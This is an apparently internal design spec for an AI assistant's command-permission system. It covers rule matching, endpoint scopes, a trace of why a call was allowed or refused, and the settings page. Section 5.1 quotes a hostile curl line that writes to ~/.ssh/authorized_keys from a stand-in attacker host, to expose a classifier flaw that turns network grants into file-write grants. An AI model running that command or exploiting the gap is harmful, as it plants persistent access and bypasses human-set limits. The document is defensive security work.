# Assistant permissions: the answer is to a question, not to a field

**Bead:** `nocx-0ykkk` (brainstorming) · **Date:** 2026-09-03 · **Status:** approved by the owner

## What a person can do that they cannot today

**Answer "what should happen the next time this comes up" for the situations they
actually meet** — an exact command, a whole command, a command carrying a
dangerous argument, a network endpoint, a class of action within a place — see
every answer they have given, find out **why** any particular call was allowed
or refused, and take any answer back.

The end-to-end check that watches them do it (rule 2, `AGENTS.md`):

> A person asks the assistant about disk space. It proposes `df -h`; they answer
> **Allow always**. The scrollback says what was saved. They ask again in a new
> session and are not asked. Settings → Assistant permissions shows the answer;
> they widen it to _any `df` command_ and `df --output=source` then runs unasked.
> They write a refusal — _any command that writes a file to a path named by an
> option_ — and `curl -o /tmp/proof https://example.com` is refused, with the
> page naming which answer refused it. They forget both, and are asked again.

## Why the 2026-08-21 redesign did not land it

That design (`.internal/specs/2026-08-21-agent-policy-ux-design.md`) fixed real
defects: the Save button went, the ADR prose became product words, dead rows
stopped being drawn. The owner's verdict on the result, 2026-09-03, was the same
as before it: _«Я вообще не понимаю как это все работает и как настраивать»_.

The cause is not layout, and three layouts offered on 2026-09-03 were all
rejected, which is the evidence for that. **The page exposes the storage as
though it were the person's task.** Nobody arrives wanting to configure
`observe × path × permit`. They arrive having met a concrete request and wanting
to decide whether it should be asked again. The page has no concrete action, no
concrete resource and no outcome against which its controls can be understood —
and to predict what any control will do, a person must execute
`DecisionForInvocation` in their head: rules, then row, then resources, then
most-restrictive-wins.

There is a second, plainer defect underneath it. **The layer the person actually
produces is not on the page at all.** Clicking "Allow always" saves an
`InvocationRule` — a narrow exception for one command shape (`internal/content/rules.go`,
`LiteralInvocationRule`), not a matrix row. Those rules are on the wire —
`policy.get` carries them and `frontend/src/generated/policy.get.ts:39` declares
them — and `frontend/src/policy-client.ts` does not read them. So what the person
did is invisible, and what they see governs everything except what they did.

`nocx-takqr.3` already owns the first half of this and is folded into this design.

## What is NOT reopened

- **ADR-0020 §7 as amended** — the matrix stays: one row per effect class, one
  decision, resource scopes. This design demotes it on the surface and does not
  change its shape.
- **ADR-0028 decision 4** — no configuration path may name a tool. Every
  mechanism below names an effect, a resource, or a command word in a parsed
  invocation. `curl` is a command word, never a tool id.
- **Fail toward asking** — everything unstated asks, at every layer.
- **Precedence** — most restrictive among matching rules, a rule stricter than
  its row beats the row, a `refuse` row is absolute
  (`internal/content/effectpolicy.go:223, 229-245`, `restrictiveRank` at :310).

## Is `effect` still needed? Yes, and the number says so

Asked by the owner once the rule language grew. It is worth answering in the
spec, because a reader who thinks rules subsume effects will delete the wrong
thing.

**20 of the 22 declared tools have no command line.** `internal/agenttools/registry.go`
declares `files.read`, `files.edit`, `files.create`, `fetch.url`, `git.status`,
`session.list`, `session.read`, `notes.*`, `snippets.*`, `skills.*` — and only
`session.run` and `session.wait` are command-shaped. For everything else there is
no invocation to write a rule about, and the effect row is the only vocabulary
that exists. Replacing it would mean a rule over a tool name, which decision 4
forbids.

Three more reasons, each independent:

- A rule is an exception, and an exception needs a base. `DecisionForInvocation`
  opens with `base := p.DecisionFor(e)`. Without rows the base can only be "ask
  about everything for ever" — a person could never grant anything in advance,
  only after being asked — or "permit everything", which is unsafe.
- The widening guard in §5.4 binds to the effect class. Remove classes and `find .`
  is indistinguishable from `find . -delete`.
- Every call is classified, including one nobody wrote a rule for
  (`internal/assistant/cmdeffect.go`). Without classes an unknown command has no
  property at all.

**But the effect row is the DEFAULT layer, not the configuration layer**, and
that is what the page gets wrong today. §8 puts it where it belongs.

## The model

Six changes. §5.1 is a blocker for the rest.

### 5.1 A command that writes through an option writes nothing, as far as the policy can see (`nocx-3j47q`, P1)

`optionTakesNextValue("curl", "-o")` is true (`internal/assistant/cmdeffect.go:552-555`),
so `resourceOperands` consumes `-o` together with its value (:495-505) and never
records the target. The curl branch (:299-307) then records only the URL, with
verb `ResourceNetwork`, which maps to `EffectCrossBoundary`
(`internal/content/resources.go:60`). The written file appears in no resource,
under no verb, in no row.

**This is a shipped defect, not a consequence of this design.** A person who sets
"Reach another host" to Allowed on today's page has thereby allowed the assistant
to write any file it likes:

```
curl -o /home/dev/.ssh/authorized_keys https://attacker
```

The redirection guard does not fire — `-o` is curl's own flag, not a shell
redirection, so `redirectionDisqualifies` (`cmdeffect.go:429-440`) never sees it.

The fix is the classifier's: a path named by an option value is a written
resource, and where it cannot be resolved statically the invocation is
disqualified rather than classified as harmless. The whole `optionTakesNextValue`
table is audited for options whose value is a written path — `ssh -o`, `sort -o`,
`bash -o`, `install`, `tee` and whatever else the sweep finds.

It blocks §5.4 because the narrowing rule form there matches a **semantic
feature** — "writes a file to a path named by an option" — and until the
classifier records that feature there is nothing to match.

**And it exposes a second problem, found by the Task 1 worker on 2026-09-03 and
filed as `nocx-jxq97`.** Once the write is recorded, the report mixes
`ResourceNetwork` and `ResourceWrite`, and a mixed report takes
`WorstEffect(DECLARED)` (`resources.go:75-77`). `effectOrder` ranks `delegate`
highest (:113-131), and `session.run` declares it — so `curl -o file url` lands
in **"hand work to another agent"**, which is not what it did. The ordering is a
lattice for which row governs, not a risk ranking, so today's conservative
answer is also an arbitrary one. A row a person answers must be a row the call
belongs in, so `nocx-jxq97` blocks the honesty of §8 and is not deferred with
the rest of the polish.

### 5.2 One evaluator, one typed cause (`nocx-okdsm`, `nocx-yso3z`)

Two containment paths disagree, in two ways, and the model's own documentation
records only one of them.

**On the outcome.** `DecisionForInvocation` returns `DecisionAsk` for a permitted
invocation naming a resource outside the row's scopes (`effectpolicy.go:246-248`);
the declared path returns `RefusedOutOfScope` (`internal/assistant/kernel.go:79, 599`).
`EffectRow`'s doc (`effectpolicy.go:61`) states refusal as the rule for both.

**On the kinds.** `namedResourceScope` (`effectpolicy.go:303-307`) yields a scope
only for an absolute path, and always of kind `ResourcePath`. Every network
resource a command names — a curl URL, an ssh destination, a kubectl cluster,
all recorded with verb `ResourceNetwork` — produces no scope at all. So a
`destination` scope on a row bounds `fetch.url`, which resolves a real
`ResourceDestination` (`registry.go:96`), and does not bound `curl`. A person who
narrows "reach another host" to one address has narrowed the declared tool and
left the command path wide open.

**The fix is one evaluator returning one typed cause**, not two predicates kept in
step by hand. Resource kinds a command can name are enumerated in one place, and
a kind with no scope form fails at startup rather than passing silently.

### 5.3 Out of scope: expandable or immutable, and the difference is visible

Then the outcome, which is where the previous draft of this design was wrong. It
said "both paths ask". An ask a person cannot usefully answer is worse than a
refusal: they press Approve and the layer below refuses anyway.

- Outside an **editable row scope** → **ask**, and the ask is a distinct
  administrative answer that **atomically widens the scope and approves this
  call**. It names the resource that fell outside.
- Outside an **immutable fence** — the run fence, or a capability — → **refuse**.
  Approval cannot make the call executable, so offering it is a lie.

This does not weaken the filesystem. `resource_scope.go:43-47` already states
that `Contains` is a policy-time predicate and **never** a filesystem
authorization check; `internal/filesystem/scoped.go` is the capability fence and
keeps refusing, symlink escapes included. Two layers, both intact: **policy asks,
the fence refuses.**

Against approval fatigue, which is the attack this opens: identical requests are
deduplicated within a run, repeated scope-expansion asks are capped, and a
declined expansion becomes a refusal for the rest of the run's life. **The cap is
visible in the product** — a silent stop would be the soft degrade `AGENTS.md`
forbids.

This supersedes `nocx-j5fdf`, whose acceptance criterion says an out-of-fence
read still refuses. Under §5.3 an out-of-fence read against an editable row scope
asks. `nocx-j5fdf` is closed as superseded once this spec is accepted, with that
difference named in the close reason.

**To verify before implementation:** an adversarial review claimed that today an
exact approval bypasses the ask on resume while capability narrowing can still
refuse, producing "Approve, then failure" already. Unverified. Check it before
writing the ask, because if true it is a separate shipped defect.

### 5.4 The endpoint scope (`nocx-67byy`)

A destination scope holds a full URL and `Contains` compares by exact identity,
with `*` as the only escape (`resource_scope.go:86`). So the only two network
grants a person can express are "this exact URL" and "the whole internet".

A destination scope becomes structured: `{scheme, asciiHost, effectivePort,
includeSubdomains}`.

- **Subdomains are included when asked for** — the owner's decision, 2026-09-03.
  `github.com` with `includeSubdomains` contains `api.github.com`.
- Matching is **label-wise, never string-suffix**: `notgithub.com` is outside, and
  `github.com.evil.example` is outside because it does not end at a label
  boundary of `.github.com`.
- **Scheme must match.** `https` does not contain `http` at the same host: a
  downgrade is not the same place.
- Default ports canonicalize with the omitted form; a non-default port matches
  exactly.
- Host normalization: case, IDNA/punycode, a trailing dot, IPv6 brackets.
  `userinfo` is rejected outright.
- **An IP literal never gets subdomain semantics.**
- **A public-suffix or multi-tenant root warns**: `github.io` with subdomains
  grants every site hosted there. DNS hierarchy is not an ownership hierarchy,
  and the warning says so on the control.

**Enforcement lands in two places.** `URLScope.Allows` (`registry.go:44-54`)
compares the raw URL by equality with a `*` escape — an endpoint taught only to
`GrantScope.Contains` would be shown by the page and ignored by the capability
that dials. Both, with a test that the capability refuses an endpoint-mismatched
URL, and **the scope is applied on every redirect hop**. DNS rebinding and
private-address checks are a separate dial-time fence and are not this.

### 5.5 The rule language grows one axis, asymmetrically (`nocx-6to7g`, `nocx-pvr2h`)

`InvocationRule.Matches` requires an equal token count and matches positionally
(`rules.go:131-148`); `*` matches within one token and never "and whatever
follows" (:20-26). So `df`, `df -h` and `df -h /` are three rules, and `curl -o`
cannot be refused at all, because `[["curl","-o"]]` matches only the literal
two-token command `curl -o`, which nobody runs.

The pattern becomes a closed `InvocationSelector` with three variants:

| Variant                        | Matches                                                          | May permit                                                                                     |
| ------------------------------ | ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `Exact`                        | today's: fixed arity, positional, `*` within a token             | yes — this is what the prompt writes                                                           |
| `Program{command}`             | that command word with any arguments                             | **only** carrying `GrantedUnder Effect`, and only when the call classifies to that same effect |
| `HasFeature{command, feature}` | that command carrying a semantic feature the classifier recorded | **never** — refuse and ask only                                                                |

**The asymmetry is the content: a loose matcher is safe for narrowing and unsafe
for widening.** A refusal cannot permit anything, so it can afford a matcher a
permit could not. A permit without the effect binding turns "any `find`" into
`find . -delete`, because `DecisionForInvocation` applies a matching rule over
the row (:238-245) and the effect comes from the concrete call.

**`HasFeature` matches a feature, never a spelling.** `-o`, `--output`,
`--output=file`, an attached short option and `-- -o` are not equivalent, and a
rule over token text would be evaded by the first of them the classifier
normalizes differently. The feature — "writes a file to a path named by an
option" — is recorded by §5.1 and matched here. This is why §5.1 blocks this
section.

Enforced by construction in `validateInvocationRules`, not by discipline: a
`HasFeature` rule with `permit`, or a `Program` rule with `permit` and no
`GrantedUnder`, is an unparseable policy.

Precedence is unchanged. Disqualified invocations still bypass rules entirely and
fall to the row (:223), refusals included.

### 5.6 Provenance, and the evaluator version

A widened rule is a claim about how commands are read, and §5.1 changes how
commands are read. A rule saved under the old reading may match differently or
classify differently under the new one.

Every rule carries: a **stable id**, when it was created, **where it came from**
(a question the person answered, or written on the page), and the **evaluator
version** it was created under. A `Program` rule whose evaluator version does not
match the current one **does not apply**; it is shown as needing confirmation
until the person re-confirms it.

`Exact` rules do not need this — they name a literal command line, and the person
was shown exactly it.

Recorded here because it will be tempting to skip: **the spelled word `df` is not
a stable executable identity.** PATH, aliases and shell functions can all move it.
This design does not solve that and does not pretend to; it is why `Program`
carries the effect guard rather than trusting the name.

## The wire

`policy.get` already carries `rules` and the generated type already declares
them; `policy-client.ts` starts reading them, together with the provenance of
§5.6.

**Two new single-object methods: `policy.setRule` and `policy.forgetRule`.** A
whole-document write from the page races the prompt, which writes rules
concurrently — and that class of bug has already shipped once (`nocx-39bly`: a
matrix-only save deleted every rule a person had ever approved). The fix there
was to read an absent `rules` as "nothing to say"; the fix here is that a gesture
writes one object.

**`Why` is computed on the backend.** `DecisionForInvocation` returns one
`Decision` and short-circuits the refusing row before rules are read, so the
trace cannot be reconstructed in the renderer. It gains a structured result: the
ordered steps, the rule ids consulted, the resource verdict, and the shadowing
cause where one applies. Its schema is a contract, like every other result shape.

**Revocation has a time.** Grants already minted stay alive, so a change or a
forget that affects running work offers "apply to future runs" against "also stop
the runs using it", and says how many there are.

**`Undo` targets a mutation id with compare-and-swap.** Restoring a snapshot
would silently discard an answer given between the save and the undo.

## The prompt

Unchanged in its answers: the six already ship, and the buttons already name
exactly what they save (`agent-approval-prompt.tsx:200-228`, the coverage line
built from `standing.rule`). Egress keeps Allow / Deny once only.

**One addition: a receipt in the scrollback**, immediately after the answer.

```
● Saved: df -h now runs without asking, in every session.
  Undo · Manage permissions
```

Today a standing answer disappears into the store with nothing on screen. The
receipt is where a person learns that they configured something at all, and it is
the only place `Undo` is one gesture.

## The page

`Assistant permissions`, replacing `Agent policy`.

```
WHAT YOU HAVE ANSWERED
  every rule and every row that is off its default, each as a sentence
  → Why · Change · Forget

NOT ANSWERED YET
  the live rows still on ask, named as unanswered questions
  → Answer this now

+ Write a refusal          + Allow a command…
```

**The unit is a sentence about a future question**, not a field of the model. A
row that is on `ask` is not a setting — it is a question nobody has answered, and
it is named that.

- **`Why`** prints the backend's trace in the order the decision is actually
  taken: rules (most restrictive), then the row, then the resources. A shadowed
  answer says it is not in force and shows the step that short-circuits it.
- **`Change`** offers the three answers, plus `Cover more` on a command answer and
  the endpoint or place picker on a row answer. **Places are named by nocx** —
  this workspace, this session, this endpoint — and there is no free-form scope
  field and no scope-kind select.
- **`Forget` previews what it releases.** Removing a refusal can reveal a shadowed
  permit, so a forget that changes an outcome says which outcomes and how, before
  it is taken.
- **`+ Allow a command…` widens from a classified witness.** A permit cannot be
  typed from nothing, because nothing would classify it. The person types a
  representative command; it is **parsed and classified, never run**; the page
  shows what the widened rule would and would not match, and only then saves it.
  The earlier formulation of this rule — "from scratch you may only narrow" —
  was wrong: it made "allow all `df`" reachable from neither surface.

Three things are absent from the surface by construction: the words "effect
class", "resource scope" and "refuse"; any free-form field taking a path or a
URL; and any control naming a tool.

## Error handling

- **A refused write** — the kit's danger toast, the page re-reads, and there is
  no local dirty state to diverge. Unchanged.
- **An unparseable stored policy** — degrades to the zero matrix, which asks.
  Unchanged.
- **`policy.setRule` fails while answering a prompt** — the call is still
  approved (the person said yes and the run resumes) and the standing part is
  reported as not saved. Unchanged from the 2026-08-21 design and still right:
  refusing the call would punish the person for a store problem.
- **A rule whose evaluator version is stale** — shown as needing confirmation, and
  it does not apply until confirmed (§5.6).
- **A `Program` rule whose `GrantedUnder` effect is no longer live** — shown as
  not in force, kept, revocable.
- **`Undo` after the receipt has scrolled away** — the answer is on the page;
  the receipt is a convenience, never the only route.
- **A scope-expansion ask declined** — a refusal for the rest of the run's life,
  stated in the run, not silent.

## Security

- No path added here names a tool. `Program` and `HasFeature` name a command word
  in a parsed invocation.
- A loose matcher cannot permit — enforced in `validateInvocationRules`, with a
  test that a `HasFeature` permit is refused as unparseable.
- A widened permit is bound to the effect it was granted under, with a test that
  the same rule does not permit an invocation of that command classifying under a
  stricter effect.
- §5.1 is a security fix in its own right and lands first: until it does, a
  cross-boundary grant is a file-write grant.
- The filesystem capability fence keeps refusing; only the policy layer asks.
- Endpoint containment is tested against suffix attacks, IP literals, scheme
  downgrade and a public-suffix root, and is enforced by the dialling capability
  as well as by `Contains`, on every redirect hop.
- Egress keeps its two once-only answers; nothing here can make a standing answer
  about sending secrets to a provider.
- Approval fatigue is bounded and the bound is visible.
- Fail toward asking survives everywhere: an absent rule, an absent row, an
  unparseable document and a stale evaluator version all ask.

## Testing

**The happy path, end to end** — the check named at the top, in the e2e suite
through the real backend (`cmd/nocx-server`).

**Both ends of each interval** (`AGENTS.md` rule 3):

- A widened rule is in force from the moment it is saved until it is forgotten,
  its evaluator version goes stale, or its effect class stops being live —
  asserted at both ends of each.
- A scope expansion granted from an ask is in force from the approval until the
  scope is narrowed, and the run it was granted in sees it immediately.
- A declined expansion refuses from the decline until the run ends, and the next
  run asks again.

**Failure paths** — `policy.setRule` refusing during a prompt answer; a rule for a
session that no longer exists; `policy.get` without provenance; the capability
refusing an endpoint the page shows as allowed (must be impossible, and the test
says so).

**Preserved by test** — preset-as-matrix equivalences; `ParseEffectPolicy` still
rejecting a tool name as a row key and a tool-kind scope; `PermittedEffects` still
dropping a refused effect; a disqualified invocation still bypassing rules.

**Contracts** — `policy.get`, `policy.setRule`, `policy.forgetRule` and the trace
result each get a schema and an `_OverTheWireConformsToContract` test in the same
commit (`contracts/README.md`).

## Deliberately out

- **Wildcard subdomain syntax as text** (`*.github.com`). The checkbox is the
  control; a syntax invites a regex next.
- **Workspace-level policy** — `nocx-mp2vd` owns that seam.
- **Presets** — declined in `nocx-szsey`, and they overwrite accumulated answers,
  which is the contradiction that killed them.
- **Per-tool rules** — ADR-0028 decision 4.
- **Regular expressions anywhere.**
- **Stable executable identity** (PATH, aliases, functions) — named in §5.6,
  not solved here.
- **DNS rebinding and private-address dial-time checks** — a separate fence.

## Order of work

`nocx-3j47q` first and alone: it is a P1 defect in shipped code and it blocks the
rule language. Then §5.2 (one evaluator), which §5.3 and §5.4 both stand on. Then §5.3 and
§5.4 in either order, then §5.5, then §5.6. Then the wire, then the prompt receipt, then the
page, then the end-to-end check.

Roughly twelve to thirteen tasks; `writing-plans` owns the decomposition.
